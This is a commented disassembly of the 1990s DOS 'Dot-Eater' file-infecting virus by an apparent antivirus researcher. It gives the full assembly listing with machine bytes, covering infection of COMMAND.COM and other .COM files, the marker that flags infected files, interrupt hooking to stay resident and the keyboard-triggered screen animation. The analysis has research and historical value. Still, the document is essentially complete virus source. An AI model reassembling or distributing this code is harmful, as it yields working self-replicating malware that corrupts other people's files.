﻿

; DOT-EATER
; Virus from Marek Filipiak collection 
;
; dissasembly by Andrzej Kadlof 1990-09-13
;
; virus do not tuch files with Read Only attribute!

0100 E9AD03        JMP     02C4      ; jump to virus code

; ....
; oryginal program
;.....
; virus code

0200 E9EF00        JMP     02F2

;---------------------------
; main infection procedure

; intercepte INT 24h

0203 B82425        MOV     AX,2524   ; set INT 24h (critical error handler)
0206 BA5204        MOV     DX,0452
0209 CD21          INT     21

; set new DTA

020B B41A          MOV     AH,1A     ; set DTA
020D BA5504        MOV     DX,0455
0210 CD21          INT     21

0212 C6066A0400    MOV     BYTE PTR [046A],00   ; clear attributes holder
0217 C7066F040000  MOV     WORD PTR [046F],0000 ; clear file size holder

; the segment of enviroment is set to 0 only when COMMAND.COM is first time
; loaded!

021D 2E            CS:
021E 833E2C0000    CMP     WORD PTR [002C],+00  ; is evniroment?
0223 7405          JZ      022A      ; absent

0225 E89102        CALL    04B9  ; locate COMMAND.COM and prepare for infection

0228 731F          JAE     0249      ; found, infect it

022A B44E          MOV     AH,4E     ; Find First
022C 33C9          XOR     CX,CX     ; file attributes
022E BA9B04        MOV     DX,049B   ; ASCIIZ filespec (*.COM)
0231 CD21          INT     21

0233 BF7304        MOV     DI,0473   ; founded file name
0236 7303          JAE     023B      ; file found

0238 EB6F          JMP     02A9      ; no more files
023A 90            NOP

023B E8C102        CALL    04FF      ; prepare for infection

023E 7309          JAE     0249      ; ready

0240 B44F          MOV     AH,4F     ; Find Next
0242 CD21          INT     21

0244 73F5          JAE     023B      ; file founded

0246 EB61          JMP     02A9      ; no more files
0248 90            NOP

; infect file

0249 51            PUSH    CX
024A B8EF00        MOV     AX,00EF   ; automodify code
024D A30201        MOV     [0101],AX
0250 B80057        MOV     AX,5700   ; get time/date of file
0253 CD21          INT     21

0255 51            PUSH    CX        ; store file time
0256 52            PUSH    DX        ; store file date
0257 E8EE02        CALL    0548      ; move file pointer at the beginning

025A B43F          MOV     AH,3F     ; Read File
025C B90300        MOV     CX,0003   ; number of bytes
025F BAA104        MOV     DX,04A1   ; to DS:DX
0262 CD21          INT     21

0264 B80242        MOV     AX,4202   ; move file pointer to the end of file
0267 33C9          XOR     CX,CX
0269 33D2          XOR     DX,DX
026B CD21          INT     21

026D 050001        ADD     AX,0100   ; file size + size of PSP = offset of virus
0270 A3E401        MOV     [01E4],AX ; store in virus body
0273 A3C601        MOV     [01C6],AX
0276 05C1FF        ADD     AX,FFC1   ; subtract 64
0279 A3A804        MOV     [04A8],AX ; store virus entry point
027C B9B003        MOV     CX,03B0   ; wirus length
027F BA0001        MOV     DX,0100   ; from DS:DX
0282 B440          MOV     AH,40     ; Write File
0284 CD21          INT     21

0286 E8BF02        CALL    0548      ; move file pointer at the beginning

0289 B440          MOV     AH,40     ; Write File
028B B90300        MOV     CX,0003   ; 3 bytes
028E BAA704        MOV     DX,04A7   ; from DS:DX
0291 CD21          INT     21

; restore file time/date

0293 B80157        MOV     AX,5701   ; set file time/date
0296 5A            POP     DX
0297 59            POP     CX
0298 80C91F        OR      CL,1F     ; set 62 seconds
029B CD21          INT     21

; restore file attributes

029D 59            POP     CX
029E B80143        MOV     AX,4301   ; set file attribute
02A1 87D7          XCHG    DI,DX
02A3 CD21          INT     21

02A5 B43E          MOV     AH,3E     ; Close File
02A7 CD21          INT     21

; restore INT 24h

02A9 B82425        MOV     AX,2524   ; set INT 24h
02AC 2E            CS:
02AD 8B161400      MOV     DX,[0014]
02B1 1E            PUSH    DS
02B2 8EDA          MOV     DS,DX
02B4 2E            CS:
02B5 8B161200      MOV     DX,[0012]
02B9 CD21          INT     21

; restore DTA

02BB 1F            POP     DS
02BC B41A          MOV     AH,1A     ; Set DTA
02BE BA8000        MOV     DX,0080   ; in PSP
02C1 CD21          INT     21

02C3 C3            RET

;==========================
; wirus main entry point
;==========================

; move 64 bytes of virus code from CS:02D8 to the end of program segment

02C4 FC            CLD

; here is patched offset of virus code in file
;                              ||
02C5 BE0002        MOV     SI,0200   ; automodyfication point
02C8 81C6D800      ADD     SI,00D8   ; find address of cs:02D8
02CC BF00FE        MOV     DI,FE00   ; destinantion
02CF B94000        MOV     CX,0040   ; 64 bytes
02D2 57            PUSH    DI        ; return address (CS:FE00)
02D3 F3            REPZ              ; move bytes
02D4 A4            MOVSB
02D5 58            POP     AX        ; get return address
02D6 FFE0          JMP     AX        ; jump to moved code (CS:01D8 here)

; move starting part (500h bytes) of infected file to CS:F900 

02D8 BE0001        MOV     SI,0100   ; beginning of mather file
02DB BF00F9        MOV     DI,F900   ; destination
02DE B90005        MOV     CX,0500   ; number of bytes
02E1 F3            REPZ
02E2 A4            MOVSB

; here is patched offset of virus code in file
; move virus code and some part of infected file at the begining of program 
; image
;                               ||
02E3 BE0002        MOV     SI,0200   ; automodyfication point
02E6 BF0001        MOV     DI,0100   ; destination
02E9 B90005        MOV     CX,0500
02EC 57            PUSH    DI
02ED F3            REPZ
02EE A4            MOVSB
02EF 58            POP     AX
02F0 FFE0          JMP     AX        ; jmp to CS:0100, moved virus code

;---------------------------------------------------------------------
; entry point after above jump (in CS:0100 if JMP 01F2)
; (remember that in real situation this code is moved 100h bytes below)

02F2 A0A104        MOV     AL,[04A1] ; store on the stack first 3 bytes
02F5 50            PUSH    AX        ; of mather program (AH is inessential)
02F6 A1A204        MOV     AX,[04A2]
02F9 50            PUSH    AX
02FA E806FF        CALL    0203      ; infect COMMAND.COM or something else

; restore oryginal 3 bytes of mather file in working area

02FD 58            POP     AX
02FE A3A204        MOV     [04A2],AX
0301 58            POP     AX
0302 A2A104        MOV     [04A1],AL

; check the presence of enviroment block

0305 2E            CS:
0306 833E2C0000    CMP     WORD PTR [002C],+00
030B 742E          JZ      033B      ; enviroment block is empty, make fun

; restore code of mather file
; move copying procedure in safe place

030D 50            PUSH    AX
030E A1A204        MOV     AX,[04A2]  ; oryginal entry point of victim
0311 50            PUSH    AX
0312 BE2102        MOV     SI,0221    ; orgin
0315 BF00FE        MOV     DI,FE00    ; destination
0318 57            PUSH    DI         ; return address
0319 B94000        MOV     CX,0040    ; 64 bytes
031C F3            REPZ
031D A4            MOVSB
031E 58            POP     AX
031F FFE0          JMP     AX         ; jmp to moved code

; move oryginal code back to CS:0100

0321 BE00F9        MOV     SI,F900
0324 BF0001        MOV     DI,0100
0327 B90005        MOV     CX,0500
032A F3            REPZ
032B A4            MOVSB
032C 58            POP     AX
032D 2E            CS:
032E A30101        MOV     [0101],AX  ; restore first 3 bytes
0331 58            POP     AX
0332 2E            CS:
0333 A20001        MOV     [0100],AL
0336 B80001        MOV     AX,0100
0339 FFE0          JMP     AX         ; go back to file

;-------------------------------------
; intercept INT 16h and stay resident

033B B89D01        MOV     AX,019D
033E A30101        MOV     [0101],AX
0341 B81625        MOV     AX,2516   ; set INT 16h (Keyboard I/O)
0344 BAA503        MOV     DX,02A5
0347 CD21          INT     21

; stay resident

0349 B8B004        MOV     AX,04B0   ; virus length + PSP
034C BB1000        MOV     BX,0010
034F 33D2          XOR     DX,DX     ; prepare division
0351 F7F3          DIV     BX        ; find number of paragraphs
0353 40            INC     AX        ; add 1 paragraph for safety (?)
0354 50            PUSH    AX        ; temporary storage
0355 40            INC     AX        ; one paragraph for MCB
0356 8CCB          MOV     BX,CS
0358 03C3          ADD     AX,BX     ; segment of new program location
035A 5B            POP     BX        ; requested amount of memory
035B 50            PUSH    AX
035C 50            PUSH    AX
035D 06            PUSH    ES
035E 8EC0          MOV     ES,AX     ; new segment
0360 33F6          XOR     SI,SI     ; sorce (PSP)
0362 33FF          XOR     DI,DI     ; destination
0364 B90001        MOV     CX,0100   ; size of moved block
0367 F3            REPZ
0368 A4            MOVSB
0369 07            POP     ES
036A 051000        ADD     AX,0010   ; size of PSP in paragraphs
036D A3AC04        MOV     [04AC],AX ; segment for loaded file in EPB
0370 B44A          MOV     AH,4A     ; modify allocated memory block
0372 CD21          INT     21

0374 BA8F04        MOV     DX,048F   ; ASCIIZ of loaded program
0377 BBAC04        MOV     BX,04AC   ; EXEC Parameter Block
037A B8034B        MOV     AX,4B03   ; Load Program Overlay
037D CD21          INT     21

; restore oryginal 3 bytes of loaded file

037F 07            POP     ES
0380 A0A104        MOV     AL,[04A1]
0383 26            ES:
0384 A20001        MOV     [0100],AL
0387 A1A204        MOV     AX,[04A2]
038A 26            ES:
038B A30101        MOV     [0101],AX

038E 58            POP     AX
038F 8CCB          MOV     BX,CS
0391 4B            DEC     BX        ; segment of memory block
0392 A3AC04        MOV     [04AC],AX ; segment of block owner
0395 8EDB          MOV     DS,BX
0397 A30100        MOV     [0001],AX ; modify MCB
039A 8ED8          MOV     DS,AX     ; set registers
039C 8ED0          MOV     SS,AX
039E 8EC0          MOV     ES,AX
03A0 2E            CS:
03A1 FF2EAA04      JMP     FAR [04AA] ; jump to file (COMMAND.COM!)

;---------------------------------------
; new INT 16h handler (Keyboard I/O)

03A5 FB            STI
03A6 1E            PUSH    DS
03A7 56            PUSH    SI
03A8 0E            PUSH    CS
03A9 1F            POP     DS
03AA 33F6          XOR     SI,SI
03AC 80FC01        CMP     AH,01     ; is keystroke ready question?
03AF 7503          JNZ     03B4      ; no

03B1 BE0100        MOV     SI,0001

03B4 9C            PUSHF
03B5 FF1E8204      CALL    FAR [0482]   ; oryginal INT 16h

03B9 9C            PUSHF
03BA 7431          JZ      03ED

03BC 83FE01        CMP     SI,+01
03BF 752C          JNZ     03ED

03C1 3C2E          CMP     AL,2E     ; '.'
03C3 7418          JZ      03DD

03C5 3C5E          CMP     AL,5E     ; '^'
03C7 7524          JNZ     03ED      ; exit

; if keystroke is '^' then restore oryginal INT 16h (in ROM!)

03C9 1E            PUSH    DS
03CA 52            PUSH    DX
03CB BA00F0        MOV     DX,F000
03CE 8EDA          MOV     DS,DX
03D0 BA2EE8        MOV     DX,E82E
03D3 B81625        MOV     AX,2516   ; set INT 16h (Keyboard I/O)
03D6 CD21          INT     21

03D8 5A            POP     DX
03D9 07            POP     ES
03DA EB11          JMP     03ED      ; exit
03DC 90            NOP

03DD E81300        CALL    03F3      ; write dot and then eat it!

03E0 50            PUSH    AX
03E1 B400          MOV     AH,00
03E3 9C            PUSHF
03E4 FF1E8204      CALL    FAR [0482] ; do oryginal INT 16h

03E8 58            POP     AX
03E9 9D            POPF
03EA 32C0          XOR     AL,AL
03EC 9C            PUSHF

03ED 9D            POPF
03EE 5E            POP     SI
03EF 1F            POP     DS
03F0 CA0200        RETF    0002      ; IRET

;---------------------------------------------------------------------------
; write dot (.) at cursor position, go to left end of the screen and eat it!

03F3 50            PUSH    AX
03F4 53            PUSH    BX
03F5 51            PUSH    CX
03F6 52            PUSH    DX
03F7 B403          MOV     AH,03     ; read cursor position
03F9 B700          MOV     BH,00
03FB CD10          INT     10

03FD FECA          DEC     DL
03FF 51            PUSH    CX
0400 52            PUSH    DX
0401 B82E0E        MOV     AX,0E2E   ; write dot as TTY
0404 B307          MOV     BL,07     ; foreground in graphic
0406 CD10          INT     10        ; video service

0408 B401          MOV     AH,01     ; set cursor shape
040A B93030        MOV     CX,3030   ; ??
040D CD10          INT     10

040F B14E          MOV     CL,4E     ; 78 limit for column number
0411 8AD1          MOV     DL,CL
0413 52            PUSH    DX
0414 E86600        CALL    047D      ; set cursor position

0417 E86A00        CALL    0484      ; write face character with sound efect

041A 51            PUSH    CX
041B B90020        MOV     CX,2000   ; time constant

041E 50            PUSH    AX
041F 58            POP     AX
0420 E2FC          LOOP    041E      ; delay

0422 59            POP     CX
0423 58            POP     AX
0424 8AD0          MOV     DL,AL
0426 E85400        CALL    047D      ; set cursor position

0429 E86900        CALL    0495      ; write space at cursor position

042C FEC9          DEC     CL
042E 58            POP     AX
042F 50            PUSH    AX
0430 3AC8          CMP     CL,AL
0432 75DD          JNZ     0411

0434 FEC1          INC     CL
0436 FEC1          INC     CL
0438 51            PUSH    CX
0439 B90001        MOV     CX,0100  ; time constant
043C E85E00        CALL    049D     ; make sound

043F 59            POP     CX

0440 8AD1          MOV     DL,CL    ; column number
0442 52            PUSH    DX       ; store it
0443 E83700        CALL    047D     ; set cursor position

0446 E83B00        CALL    0484     ; write face character with sound

0449 51            PUSH    CX
044A B92000        MOV     CX,0020  ; time constant
044D E84D00        CALL    049D     ; make sound

0450 59            POP     CX
0451 51            PUSH    CX
0452 B90010        MOV     CX,1000  ; delay connstant

0455 50            PUSH    AX
0456 58            POP     AX
0457 E2FC          LOOP    0455     ; delay loop

0459 59            POP     CX
045A 58            POP     AX
045B 8AD0          MOV     DL,AL
045D E81D00        CALL    047D      ; set cursor position (DX)

0460 E83200        CALL    0495      ; write space at cursor position

0463 FEC1          INC     CL        ; next column
0465 80F94E        CMP     CL,4E     ; 78?
0468 75D6          JNZ     0440      ; no

046A 5A            POP     DX
046B B401          MOV     AH,01     ; set cursor shape
046D 59            POP     CX
046E CD10          INT     10

0470 B402          MOV     AH,02     ; set cursor position
0472 FEC2          INC     DL
0474 B700          MOV     BH,00
0476 CD10          INT     10

0478 5A            POP     DX
0479 59            POP     CX
047A 5B            POP     BX
047B 58            POP     AX
047C C3            RET

;-----------------------
; set cursor position

047D B402          MOV     AH,02     ; set cursor position
047F B700          MOV     BH,00
0481 CD10          INT     10

0483 C3            RET

;-----------------------------------------------------------
; write face character with sound efect in cursos position

0484 B40E          MOV     AH,0E     ; write character as TTY subfunction
0486 B307          MOV     BL,07     ; foregroung in graphic
0488 51            PUSH    CX
0489 B94000        MOV     CX,0040   ; time constant
048C E80E00        CALL    049D      ; make sound

048F 59            POP     CX
0490 B001          MOV     AL,01     ; face character
0492 CD10          INT     10        ; eat dot!

0494 C3            RET

;---------------------------------
; write space in cursor position

0495 B8200E        MOV     AX,0E20   ; write space as TTY
0498 B307          MOV     BL,07     ; foreground in graphic
049A CD10          INT     10

049C C3            RET

;---------------------
; sound procedure

049D 50            PUSH    AX
049E E461          IN      AL,61     ; get state of PPI
04A0 50            PUSH    AX
04A1 8AE0          MOV     AH,AL
04A3 80CC02        OR      AH,02     ; speaker on

04A6 E661          OUT     61,AL
04A8 86E0          XCHG    AL,AH
04AA 51            PUSH    CX

04AB 50            PUSH    AX
04AC 58            POP     AX
04AD E2FC          LOOP    04AB     ; delay

04AF 59            POP     CX
04B0 E2F4          LOOP    04A6

04B2 58            POP     AX
04B3 24FC          AND     AL,FC     ; speaker off
04B5 E661          OUT     61,AL
04B7 58            POP     AX
04B8 C3            RET

;--------------------------------------------------------------------
; locate COMMAND.COM by finding COMSPEC= in enviroment and prepare it
; for infection (open, clear attributes, move file pointer at the
; beggining).

04B9 2E            CS:
04BA A12C00        MOV     AX,[002C] ; get enviroment
04BD BE8604        MOV     SI,0486   ; adress of 'COMSPEC=' string
04C0 06            PUSH    ES
04C1 8EC0          MOV     ES,AX
04C3 33FF          XOR     DI,DI     ; ES:DI start of enviroment block

04C5 8BDE          MOV     BX,SI     ; [BX] = 'C'
04C7 26            ES:
04C8 804D00        CMP     BYTE PTR [DI],00 ; is enviroment block empty?
04CB 7503          JNZ     04D0      ; no

04CD 07            POP     ES
04CE F9            STC
04CF C3            RET

04D0 8A07          MOV     AL,[BX]   ; get letters
04D2 0AC0          OR      AL,AL     ; end of string?
04D4 7413          JZ      04E9      ; yes

04D6 26            ES:
04D7 3A05          CMP     AL,[DI]   ; compare with enviroment string
04D9 7504          JNZ     04DF      ; not equal

04DB 43            INC     BX        ; get next letter
04DC 47            INC     DI
04DD EBF1          JMP     04D0      ; continue search

04DF 32C0          XOR     AL,AL     ; look for the next string
04E1 B9FFFF        MOV     CX,FFFF   ; size of block (maximum possible)
04E4 FC            CLD
04E5 F2            REPNZ
04E6 AE            SCASB             ; look for 0
04E7 EBDC          JMP     04C5

; COMSPEC= founded, DI points at path to COMMAND.COM, copy it to own buffer

04E9 BE7304        MOV     SI,0473

04EC 26            ES:
04ED 8A05          MOV     AL,[DI]
04EF 8804          MOV     [SI],AL
04F1 46            INC     SI
04F2 47            INC     DI
04F3 0AC0          OR      AL,AL
04F5 75F5          JNZ     04EC

04F7 07            POP     ES
04F8 BF7304        MOV     DI,0473
04FB E80100        CALL    04FF      ; prepare file for infection

04FE C3            RET

;---------------------------
; prepare file for infection

04FF F6066A0404    TEST    BYTE PTR [046A],04  ; System file?
0504 7402          JZ      0508                ; no

0506 F9            STC
0507 C3            RET

0508 813E6F0400F8  CMP     WORD PTR [046F],F800 ; maximum length of file
050E 7602          JBE     0512

0510 F9            STC
0511 C3            RET

; Check is the file already infected (look at seconds in file time stamp).
; Here is logical bug. Virus is trying to open file in Read/Write mode
; before clearing flag Read Only. So files with this attribute are safe!

0512 B8023D        MOV     AX,3D02   ; Open File
0515 8BD7          MOV     DX,DI
0517 CD21          INT     21

0519 7301          JAE     051C

051B C3            RET

051C 93            XCHG    BX,AX     ; store handle
051D B80057        MOV     AX,5700   ; get file date/time
0520 CD21          INT     21

0522 80E11F        AND     CL,1F     ; extract seconds
0525 80F91F        CMP     CL,1F     ; = 62 ?
0528 7506          JNZ     0530      ; not infected yet
                                     
052A B43E          MOV     AH,3E     ; Close File
052C CD21          INT     21

052E F9            STC
052F C3            RET

0530 B80043        MOV     AX,4300   ; get file attributes
0533 8BD7          MOV     DX,DI
0535 CD21          INT     21

0537 51            PUSH    CX
0538 B80143        MOV     AX,4301   ; set file attributes
053B 33C9          XOR     CX,CX     ; clear all atributes
053D CD21          INT     21

053F 59            POP     CX
0540 7305          JAE     0547      ; RET

0542 B43E          MOV     AH,3E     ; Close File
0544 CD21          INT     21

0546 F9            STC
0547 C3            RET

;-------------------------------------
; move file pointer at the beginning

0548 B80042        MOV     AX,4200
054B 33C9          XOR     CX,CX
054D 33D2          XOR     DX,DX
054F CD21          INT     21

0551 C3            RET

;---------------------
; new INT 24 handler

0552 B003          MOV     AL,03
0554 CF            IRET

;------------------------------------------------------------------------
; virus working area, in active virus this area is moved 100h bytes down
; new DTA

0555  00 00 00 00 00 00 00 00 00 00 00   ; 21 bytes reserved by DOS
0560  00 00 00 00 00 00 00 00 00 00
056A  00                  ; file attribute
056B  00 00 00 00         ; time and data stamps
056F  00 00 00 00         ; file size
0573  00 00 00 00 00 00 00 00 00 00 00 00 00 ; ASCIIZ file name (13 bytes)
0580  00 00
0582  2E E8 00 F0                 ; old INT 16h
0586  43 4F 4D 53 50 45 43 3D 00  ; COMSPEC=.
058F  43 4F 4D 4D 41 4E 44 2E 43 4F 4D 00  ; COMMAND.COM, ASCIIZ of loaded file
059B  2A 2E 43 4F 4D              ;  *.COM

05A0  00
05A1  00 00 00             ; oryginal first 3 byte of next victim
05A3  00 00 00 
05A7  E9 00 00             ; new 3 bytes for infected file
05AA  00 01                ; offset file entry point        

; 4 bytes EPB (for AL = 3)

05AC  00 00                ; segment for loaded file
05AE  00 00                ; ignored


